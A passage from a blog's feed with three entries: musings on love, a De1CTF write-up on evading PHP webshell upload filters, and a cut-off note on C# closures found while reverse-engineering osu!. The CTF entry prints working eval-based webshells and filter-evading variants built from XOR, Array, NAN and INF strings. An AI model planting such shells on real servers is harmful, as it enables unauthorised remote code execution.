    <content type="html"><![CDATA[<blockquote><p>对“爱”这一情感的一些非常零散的想法与思考</p></blockquote><h2 id="爱">爱</h2><p>是一件很难下定义的情感。<br>这种爱，是人从最基本的生存需要中发展出的丰富的社会情感，与所有情感一同成为了人之所以为人的一部分。</p><h4 id="父母">父母</h4><p>父母之间的爱，是经历了时间考验的爱。<br>从相遇，从别离又重逢，从一封封信件，到一同面对生活，到有我，到每一次的理解包容，到平常的每一天。<br>父母，是我理解爱的一个窗口。</p><h4 id="致橡树">致橡树</h4><p>是伟大的爱。<br>根，紧握在地下；叶，相触在云里。<br>理想的爱是美丽的</p><h4 id="姥姥">姥姥</h4><p>厮守。平凡。坚强。</p><h4 id="文字">文字</h4><p>用文字写清爱，大概是不可能的。<br>网络上那么多的“爱的高级表达”，都觉得好苍白无力<br>“爱是人类最复杂，最伟大，最深层的情感”</p><h2 id="喜欢与爱">喜欢与爱</h2><blockquote><p>坐在一起，什么都不用想，什么都不用做<br>就纯粹地坐在一起，看着你的眼睛。</p></blockquote><p>喜欢与爱，大概没有一个明确的分界线。<br>初识，了解，关注，在意，喜欢，爱</p><h4 id="歌德">歌德</h4><p>浪漫主义与现实</p><h4 id="责任">责任</h4><p>爱不仅仅是简单的情感。爱带来了很多需要直面的事情。<br>准备好面对时，才配得上说爱。<br>对未来的思考</p><h4 id="我">我</h4><p>也许，算？<br>不知道。<br><strong>探寻</strong></p><h2 id="misc">misc</h2><h4 id="emmm。。">emmm。。</h4><p>现在回想起来还挺对不起高中老师的emmm…<br>后悔么？不可能。</p><h4 id="情感">情感</h4><p>记得前段时间有个很有意思的想法<br>人的情感状态可以表示为若干维空间中的一个向量<br>而一个种类的情感是这一空间中的一个张量</p><h4 id=""></h4><p>也许现在的想法还是很幼稚吧</p><blockquote><p>由于很多地方不太好意思写，思考这种问题时我也组织不起来语言，所以是非常碎片化的关键词</p></blockquote><blockquote><p>Love encompasses <strong>a range of</strong> strong and positive emotional and mental states, from the most sublime virtue or good habit, the deepest interpersonal affection and to the simplest pleasure.<br>– wikipedia</p></blockquote><h4 id="一些摘抄">一些摘抄</h4><ul><li>根，紧握在地下；叶，相触在云里。  --舒婷</li><li>草在结它的种子，风在摇它的叶子。我们站着，不说话就十分美好。 --顾成</li><li>我这一生都是坚定不移的唯物主义者，唯有你，我希望有来生。 --周恩来</li></ul><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;对“爱”这一情感的一些非常零散的想法与思考&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;爱&quot;&gt;爱&lt;/h2&gt;
&lt;p&gt;是一件很难下定义的情感。&lt;br&gt;
这种爱，是人从最基本的生存需要中发展出的丰富的社会情感，与所有情感一同成为了人之所以为人的一</summary>
      
    
    
    
    
    <category term="Misc" scheme="https://blog.frankli.site/tags/Misc/"/>
    
    <category term="life" scheme="https://blog.frankli.site/tags/life/"/>
    
  </entry>
  
  <entry>
    <title>从一道题到PHP Shell WAF绕过</title>
    <link href="https://blog.frankli.site/2020/05/10/Security/PHP%20Shell%20Bypass/"/>
    <id>https://blog.frankli.site/2020/05/10/Security/PHP%20Shell%20Bypass/</id>
    <published>2020-05-09T16:00:00.000Z</published>
    <updated>2021-04-11T21:39:44.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="起因">起因</h2><p>De1CTF 2020 中有一道渗透题Hard_Pentest，第一步是要上传一个php文件shell，而这个上传点当然是有waf的<br>经过fuzz，确认能够使用的字符如下：<br><code>!&quot;#$%'()*+,-./:&lt;=&gt;?@[\]_&#123; &#125;</code><br>我们能发现可用的字符中无字母，无数字，更重要的是无分号</p><h2 id="这道题">这道题</h2><p>在这道题中，通过尝试我们能发现可以通过short open tag替代分号的作用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="variable">$a</span>=<span class="number">1</span><span class="meta">?&gt;</span><span class="meta">&lt;?=</span><span class="variable">$a</span><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// 1</span></span><br></pre></td></tr></table></figure><p>也就是说，拿一个经典的无数字字母shell来稍加修改（<code>replace(';', '?&gt;&lt;?=')</code>）即可构造出这样一个shell<br>但是我自然不会善罢甘休，想要总结一下<strong>各个版本</strong>中shell waf的绕过方式<br>下面我们从几个初始状态开始，逐步缩减可用的字符集，看看不一样的绕过方式</p><h3 id="说明">说明</h3><p>此处对下一部分如何归类与标注标题做一下简单的说明<br>我将从两个初始状态开始（无字母、白名单<code>0b</code>与无字母、黑名单<code>0w</code>）向别的状态转移<br>当然b与w分别代表blacklist与whitelist<br>当状态发生转移时，将在状态代号（如<code>0b</code>）后附加一个点（.）并添加新的状态代号，比如<code>0b.0</code>, <code>0b.1</code><br>像上面那样同以<code>0b.</code>开头的状态说明这两个状态都是由<code>0b</code>状态转移而来</p><h2 id="Webshell-Bypass">Webshell Bypass</h2><h3 id="root-strings-printable">root strings.printable</h3><p>这是一个普通的webshell：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[_]);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[_];<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>让我们先ban掉一些普通的字符吧，先拿方括号开刀</p><h3 id="root-0-ban掉">root.0 ban掉[]</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>&#123;_&#125;);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>&#123;_&#125;;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>让我们读一读手册</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">https://www.php.net/manual/en/language.types.array.php</span><br><span class="line"><span class="quote">&gt; Note:</span></span><br><span class="line"><span class="quote">&gt; Both square brackets and curly braces can be used interchangeably</span></span><br><span class="line"><span class="quote">&gt; for accessing array elements (e.g. `$array[42]` and `$array&#123;42&#125;` will</span></span><br><span class="line"><span class="quote">&gt; both do the same thing in the example above).</span></span><br><span class="line"></span><br><span class="line">As of PHP 5.4 it is possible to array dereference the result of a</span><br><span class="line">function or method call directly. Before it was only possible using</span><br><span class="line">a temporary variable.</span><br><span class="line"></span><br><span class="line">As of PHP 5.5 it is possible to array dereference an array literal.</span><br></pre></td></tr></table></figure><h3 id="root-1-ban掉分号">root.1 ban掉分号</h3><p>这个好办，上面已经给出了解决方案，在此例中只要去掉分号就好了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[_])<span class="meta">?&gt;</span><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[_]<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="root-2-ban掉引号">root.2 ban掉引号</h3><p>你在上面见到引号了么？</p><h3 id="root-3-ban掉大小写字母">root.3 ban掉大小写字母</h3><p>这样的shell一开始由p师傅（ORZORZORZORZORZORZ）发布在<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">博客</a>中，后来又有一篇<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">提高篇</a>讨论了php7下与unix glob引出的无字母webshell的利用。</p><p>首先我们要想怎么能通过字符串来取到对应的变量</p><p>从<a href="https://www.php.net/manual/en/language.oop5.basic.php#:~:text=as%20of%20PHP%205.3.0">PHP5.3.0起</a>，字符串变量可以被当作函数直接调用，从PHP7开始这个字符串甚至不需要赋给一个单独的变量</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$x</span>=<span class="string">&quot;phpinfo&quot;</span>;<span class="variable">$x</span>();</span><br></pre></td></tr></table></figure><p>也就是说如果我们能够利用某些方式通过别的字符构造出函数名，从而进行调用</p><p>p师傅的这篇博客中介绍了两种办法：</p><h3 id="root-3-w-无字母，白名单">root.3.w 无字母，白名单</h3><p>首先要彻底没有字母，除非他已经帮你把php tag打开了（在eval里），不然一定是开着short open tag的。</p><p>PHP5.4.0起，<code>&lt;?=</code>短开标签是一直可用的。虽然输出的垃圾信息多了一点但是不影响它好用啊（<br>当然，为了更短的长度，short open tag选项打开的时候还是尽量用<code>&lt;?</code>更舒适。</p><p>总之，要解决白名单，当务之急是拓展可用的字符。</p><p>php的&quot;.“字符串拼接符号是一个绝妙的将对象转为字符类型的工具。只要有了”.&quot;就可以构造出很多字符。</p><h3 id="root-3-w-0-Array">root.3.w.0 Array</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span><span class="variable">$_</span>=[];<span class="variable">$_</span>.=<span class="number">0</span>;<span class="meta">?&gt;</span> <span class="comment">// .=[]，.=&#x27;&#x27;，.=0/0，随便什么都行</span></span><br><span class="line"><span class="meta">&lt;?=</span><span class="variable">$_</span>[<span class="number">3</span>]<span class="meta">?&gt;</span> <span class="comment">// a</span></span><br><span class="line"><span class="meta">&lt;?=</span><span class="variable">$_</span>+++<span class="variable">$_</span>+++<span class="variable">$_</span>+++<span class="variable">$_</span>++<span class="meta">?&gt;</span> <span class="comment">// 以此类推能拿到a-z</span></span><br><span class="line"><span class="meta">&lt;?=</span><span class="variable">$_</span>[<span class="number">0</span>]<span class="meta">?&gt;</span> <span class="comment">// A，同理能拿到A-Z</span></span><br></pre></td></tr></table></figure><p>通过连加的方式可以缩短payload长度（谭浩强警告）</p><h3 id="root-3-w-1-NAN-INF-ANIF">root.3.w.1 NAN, INF (ANIF)</h3><p>自<strong>PHP7</strong>以来，为了<a href="https://www.php.net/manual/en/migration70.incompatible.php#migration70.incompatible.integers.div-by-zero">遵从IEEE规范</a>，0/0与1/0返回的是常量<code>float(NAN)</code>与<code>float(INF)</code>。没错，它们在转字符串的时候还就是<code>&quot;NAN&quot;</code>与<code>&quot;INF&quot;</code>。那么有了A、N、I、F四个字符我们能够构造出那些字符呢？</p><p>所有字符。</p><p>PHP函数实际上是<a href="https://www.php.net/manual/en/functions.user-defined.php#:~:text=Function%20names%20are%20case-insensitive">不区分大小写</a>的。所以我们可以。。。</p><p><code>TOLOWER</code>！这样我们就能构造出大小写所有字母了。有了字母我们当然可以进一步构造出所有字符。</p><h3 id="root-3-w-1-0-连数字也没有怎么办">root.3.w.1.0 连数字也没有怎么办</h3><p>true和false在php里是1和0<br>也就是说<code>true/false == INF</code>，<code>false/false == NAN</code><br>构造出true和false那还不简单</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[]&gt;[] == false</span><br><span class="line">[[]]&gt;[] == true</span><br></pre></td></tr></table></figure><p>只要让你闭合tag你就有生存空间</p><h3 id="root-3-w-3-ban掉-存疑">root.3.w.3 ban掉&quot;.&quot; (?存疑)</h3><p>如果没了字符串拼接符号，也就是缺少了一大obj-&gt;str的途径，那么还有没有可能构造出额外的字符呢？</p><h3 id="root-3-b-无字母，黑名单">root.3.b 无字母，黑名单</h3><p>黑名单就好玩了，用什么字符都可以，那么只需要补齐题目ban掉的那些字符即可。当然对于非强迫症而言<strong>有可能</strong>只需要补齐一部分字符就能做出题了。</p><p>由于php只支持256单字节字符，很多unicode字符（比如中文）的长度大于1（<code>strlen(&quot;啊&quot;)===3</code>），也就是说我们实际上是能“切”出一部分的值拿来进行运算的（<code>&quot;啊&quot;[0] === &quot;\xe5&quot;</code>）。具体为何请参考unicode表。<br>在实际操作中，用汉字切与直接输入不可见字符没有本质的区别，但更直观一些（至少你能看见）</p><p>有一点就是对字符串位运算实际上不需要一个个字符串拼接。PHP会逐字节将两侧的字符串喂给位运算，得到新的字符串。</p><h3 id="root-3-b-x-异或">root.3.b.x 异或</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=<span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>; <span class="comment">// _GET</span></span><br><span class="line">$&#123;<span class="variable">$_</span>&#125;[_]($&#123;<span class="variable">$_</span>&#125;[__]);</span><br></pre></td></tr></table></figure><h3 id="root-3-b-r-取反与或非">root.3.b.r 取反与或非</h3><p>略，见p师傅博客与各大搜索引擎</p><h3 id="root-4-ban掉一些标识符">root.4 ban掉一些标识符</h3><h3 id="root-4-0-进制转换">root.4.0 进制转换</h3><p><code>base_convert</code>函数提供2-36进制的转换，可以轻松提供数字到<code>a-z</code>字母的转换。<br><code>dechex</code>也可以通过数字获得<code>a-f</code>的值</p><h3 id="root-4-1-数学函数">root.4.1 数学函数</h3><p>由于很少碰到，不展开讲了。但是见到标题应当能想到该做什么了。</p><h2 id="1">-1</h2><p>这里仅对一些可能的webshell绕<strong>内容</strong>waf方式进行了微小的总结。其实不难发现每个绕waf的技巧都来源于php自身的动态性以及对<strong>字符串</strong>的各种奇妙操作。<br>文中大部分跨版本不兼容的地方都进行了php文档链接的标注，以供参考。这也是本文之所以存在的一大理由。</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;起因&quot;&gt;起因&lt;/h2&gt;
&lt;p&gt;De1CTF 2020 中有一道渗透题Hard_Pentest，第一步是要上传一个php文件shell，而这个上传点当然是有waf的&lt;br&gt;
经过fuzz，确认能够使用的字符如下：&lt;br&gt;
&lt;code&gt;!&amp;quot;#$%&#39;()*+,</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://blog.frankli.site/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Osu逆向过程中的一些小结</title>
    <link href="https://blog.frankli.site/2020/02/07/Security/Osu%E9%80%86%E5%90%91%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E7%BB%93/"/>
    <id>https://blog.frankli.site/2020/02/07/Security/Osu%E9%80%86%E5%90%91%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E7%BB%93/</id>
    <published>2020-02-07T09:04:59.000Z</published>
    <updated>2022-06-29T15:43:15.000Z</updated>
    
    <content type="html"><![CDATA[<p>由于MacOS Catalina上32bit程序惨遭抛弃，最近一段时间实在没动力为了玩osu!而重启电脑切Windows，于是最近几周在逆旧版的osu!，试图搞清楚关于player point统计、聊天室协议等一系列实现。由于逆的过程中碰到了一些关于微软roslyn的具体实现的问题，刚好这玩意开源。读了读一些代码，就觉得有些东西挺值得写写的。</p><h2 id="目录">目录</h2><ul><li>Display Class 与 lambda</li><li>Backing Field 与 getter/setter</li><li>CompilerGeneratedAttribute 与 ILSpy</li><li>临时变量</li><li><code>(CS$)?&lt;(.+)&gt;([0-9a-s]__.*)([0-9]*)?</code></li></ul><h2 id="Display-Class-与-lambda">Display Class 与 lambda</h2><p>在C#中，一个 lambda function 的语法如下：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// in some function</span></span><br><span class="line">(parameter1, parameter2) =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> do_something(parameter1, parameter2);</span><br><span class="line">&#125;</span><br><span class="line">(parameter1, parameter2) =&gt; do_something(parameter1, parameter2);</span><br></pre></td></tr></table></figure><p>在利用网上的各种工具对 osu! 进行反混淆后，先拿 dnSpy 调一调，发现 osu 对文件的哈希进行了比较复杂的认证，索性直接丢到 ILSpy 里头。（具体步骤参考<a href="https://github.com/frankli0324/osu-reversed">osu-reversed</a>）<br>看了看反编译出来的文件，发现里头有很多非法的符号名，最显眼的就是<code>&lt;&gt;c_DisplayClass</code>。这个<code>DisplayClass</code>就非常的让人摸不着头脑，遂谷歌</p><p><code>anonymous method closure class</code></p><p>为了弄清楚<code>DisplayClass</code>到底是什么东西，先得了解几个概念</p><p>打开维基百科*，一句一句地看</p><blockquote><p>*注：英文。维护维基中文的一帮人就是群憨批。</p></blockquote><h3 id="作用域">作用域</h3><blockquote><p>In programming languages, a closure, also lexical closure or function closure, is a technique for implementing <strong>lexically scoped</strong> name binding in a language with first-class functions.</p></blockquote><p>平常总是说作用域作用域什么的，好像都能理解。但是一说到定义就很模糊了。恰巧，要深刻理解闭包，正要深刻理解作用域，这里就稍稍明晰一下作用域的概念</p><p>此处尝试写了点东西，发现自己说得不太清楚，还是放几个传送门把。<br>看的时候不要以“js是这么干的”或者“python是这么干的”这么想，要以“编程是这么干的”这种思路看。</p><p><a href="https://en.wikipedia.org/wiki/Scope_(computer_science)#Lexical_scope_vs._dynamic_scope">Scope</a><br><a href="https://github.com/getify/You-Dont-Know-JS/blob/1st-ed/scope%20%26%20closures/ch1.md#enginescope-conversation">YouDontKnowJS</a></p><p>关于词法作用域与动态作用域再说一点。同样举个🌰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在某一变量b的作用域内，不管它是全局变量还是啥 </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">a</span>):</span><br><span class="line">    <span class="keyword">return</span> a+b</span><br><span class="line"></span><br><span class="line">c = <span class="number">5</span></span><br><span class="line">f(c)</span><br></pre></td></tr></table></figure><p>对于函数<code>f</code>的<strong>定义</strong>来说，b的这个作用域就是“词法作用域”，而对于函数<code>f</code>的<strong>调用</strong><code>f(c)</code>来说，c的这个作用域就是“动态作用域”。<br>其实顾名思义，词法作用域是词法决定的，动态作用域是运行时决定的，这句话说得挺准确的，但是的确不太好理解。</p><p>Q: “<code>f(c)</code>不也是程序编写的时候就写好的🐎？”A: “它不是<strong>词法</strong>决定的”</p><h3 id="自由变量">自由变量</h3><blockquote><p>Operationally, a closure is a record storing a function together with an environment. The environment is a mapping associating each free variable of the function (variables that are used locally, but defined in an enclosing scope) with the value or reference to which the name was bound when the closure was created.</p></blockquote><p>从这句话中，我们看到了“free variable”一词。我们用python实例来说明“free variable”</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: <span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">a</span>): </span><br><span class="line">   ...:     <span class="keyword">def</span> <span class="title function_">g</span>(<span class="params">b</span>): </span><br><span class="line">   ...:         <span class="keyword">return</span> a+b </span><br><span class="line">   ...:     <span class="keyword">return</span> g </span><br><span class="line">   ...:</span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: f(<span class="number">1</span>)(<span class="number">2</span>)</span><br><span class="line">Out[<span class="number">2</span>]: <span class="number">3</span></span><br></pre></td></tr></table></figure><p>除去函数，这里涉及到了<code>a</code>, <code>b</code>两个变量。对于函数<code>f</code>来说，<code>a</code>是它的参数，但函数<code>g</code>却完全在<code>a</code>的作用域（此处即函数<code>f</code>的函数体）内。此时，<code>g</code>的自由变量就是<code>a</code>。<br>回头看一眼&quot;free variable&quot;的wiki：In computer programming, the term <strong>free variable</strong> refers to variables used in a function that are neither local variables nor parameters of that function. The term non-local variable is often a synonym in this context.</p><p>举一个极端点的例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">a</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">g</span>(<span class="params">b</span>):</span><br><span class="line">        use a</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">h</span>(<span class="params">c</span>):</span><br><span class="line">            use a <span class="keyword">and</span> b</span><br><span class="line">            <span class="keyword">def</span> <span class="title function_">i</span>(<span class="params">d</span>):</span><br><span class="line">                use a <span class="keyword">and</span> b <span class="keyword">and</span> c</span><br><span class="line">                <span class="keyword">def</span> <span class="title function_">j</span>(<span class="params">e</span>):</span><br><span class="line">                    use d</span><br><span class="line">                    ...</span><br></pre></td></tr></table></figure><p>对于<code>g</code>来说<code>a</code>是自由变量，而对于<code>f</code>不是；对于<code>h</code>来说<code>a</code>、<code>b</code>是自由变量，而对于<code>g</code>来说<code>b</code>不是；对于<code>i</code>来说<code>a</code>、<code>b</code>、<code>c</code>是自由变量等等等等等。</p><h3 id="闭包">闭包</h3><blockquote><p>Unlike a plain function, a closure allows the function to access those captured variables through the closure’s copies of their values or references, even when the function is invoked outside their scope.</p></blockquote><p>如果明白了上面的，也就好理解这句话了。它们已经在闭包内了。你要有一个闭包，就必有前面的哪些自由变量。这个闭包又必在这些自由变量的作用域内。我们再看上面的话，不就是在说<code>闭包就是一个用到了不是局部变量的函数</code>罢了。</p><blockquote><p>闭包一词经常和匿名函数混淆。这可能是因为两者经常同时使用，但是它们是不同的概念。</p></blockquote><blockquote><p>定义域？作用域？</p></blockquote><blockquote><p>感觉说了一堆废话就为了说一个挺直白的概念</p></blockquote><h3 id="匿名函数">匿名函数</h3><p>理解了闭包，我们再来看匿名函数。<br>一个匿名函数是否构成闭包，取决于它<strong>有没有捕获外部变量</strong>。如何理解呢？那就先请出主角：rosyln</p><p>那么，清楚了闭包的概念，rosyln是如何处理闭包的呢？这就是<code>DisplayClass</code>上来的地方了。</p><blockquote><p>根据StackOverflow上的某个答案（翻不到了，Chrome tab开太多了），<code>DisplayClass</code>是rosyln的一个命名失误。它本来应该叫<code>ClosureClass</code><br><s>憨批Microsoft</s>  Microsoft NB</p></blockquote><p>也就是说，rosyln试图将所有的闭包都单独放到一个类中，给它们创建单独的作用域环境。如此以来，只要找到这个闭包使用到的所有自由变量，在运行时（动态作用域下）将这些自由变量放到这个新的类里头，就可以轻松地给C#加上闭包的支持。</p><blockquote><p>为什么说“加上”呢？C#2.0正式支持匿名函数，C#3.0支持lambda，而Local Functions直到C#7.0才支持，也就是可以说C#2.0正式支持了闭包。<br>From Microsoft docs: C# version 2.0 introduced the concept of anonymous methods, which allow code blocks to be passed as parameters in place of a separately defined method. C# 3.0 introduced lambda expressions as a more concise way of writing inline code blocks. Both anonymous methods and lambda expressions (in certain contexts) are compiled to delegate types. Together, these features are now known as anonymous functions. For more information about lambda expressions, see Lambda expressions.</p></blockquote><p>我们来做一些实验：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Program</span> &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span> ()</span> &#123;</span><br><span class="line">            Action f = () =&gt; &#123; <span class="keyword">return</span>; &#125;;</span><br><span class="line">            f ();</span><br><span class="line">            Assembly asm = Assembly.GetAssembly (<span class="keyword">typeof</span> (Program));</span><br><span class="line">            IList&lt;Type&gt; classes = asm.GetTypes ()</span><br><span class="line">                .Where (x =&gt; x.IsClass)</span><br><span class="line">                .ToList ();</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="keyword">var</span> i <span class="keyword">in</span> classes) Console.WriteLine (i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Test.Program</span></span><br><span class="line"><span class="comment">Test.Program+&lt;&gt;c</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>上面的程序中创建了一个没有传入参数，没有返回值的匿名函数</p><p>由于匿名函数没有捕获其所在作用域内的任何变量，故这个函数<strong>不构成闭包</strong></p><blockquote><p>&lt;&gt;c不是我们关心的东西</p></blockquote><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span> ()</span> &#123;</span><br><span class="line">            <span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line">            Func&lt;<span class="built_in">int</span>&gt; f = () =&gt; a;</span><br><span class="line">            f ();</span><br><span class="line">            Assembly asm = Assembly.GetAssembly (<span class="keyword">typeof</span> (Program));</span><br><span class="line">...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Test.Program</span></span><br><span class="line"><span class="comment">Test.Program+&lt;&gt;c__DisplayClass0_0</span></span><br><span class="line"><span class="comment">Test.Program+&lt;&gt;c</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>对上面的程序做略微的修改，这个匿名函数现在使用了在<code>Main</code>函数中的变量<code>a</code>，<strong>构成了闭包</strong>，同时我们能看到出现了一个名叫<code>Program+&lt;&gt;c__DisplayClass0_0</code>的类。</p><p>打开反编译器，让我们康康它到底是个啥。</p><p>默认情况下，ILSpy会忽略掉编译器生成的各种东西，那既然我们知道匿名函数是C#2.0出来的东西，那我们就照着C#1.0来逆，ILSpy就会不知道该咋办从而显示出来了</p><p>貌似windows上Ilspy GUI里头还有显示Compiler Generated的选项。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ilspycmd output.dll -lv CSharp1</span><br></pre></td></tr></table></figure><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// in namespace Test :</span></span><br><span class="line">[<span class="meta">CompilerGenerated</span>]</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">sealed</span> <span class="keyword">class</span> &lt;&gt;<span class="title">c__DisplayClass0_0</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> a;</span><br><span class="line">    <span class="keyword">internal</span> <span class="built_in">int</span> &lt;Main&gt;b__0() &#123;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// in function Main() :</span></span><br><span class="line">Program.&lt;&gt;c__DisplayClass0_0 CS$&lt;&gt;<span class="number">8</span>__locals1 = <span class="keyword">new</span> Program.&lt;&gt;c__DisplayClass0_0();</span><br><span class="line">CS$&lt;&gt;<span class="number">8</span>__locals1.a = <span class="number">1</span>;</span><br><span class="line">Func&lt;<span class="built_in">int</span>&gt; f = <span class="keyword">new</span> Func&lt;<span class="built_in">int</span>&gt;(CS$&lt;&gt;<span class="number">8</span>__locals1.&lt;Main&gt;b__0);</span><br><span 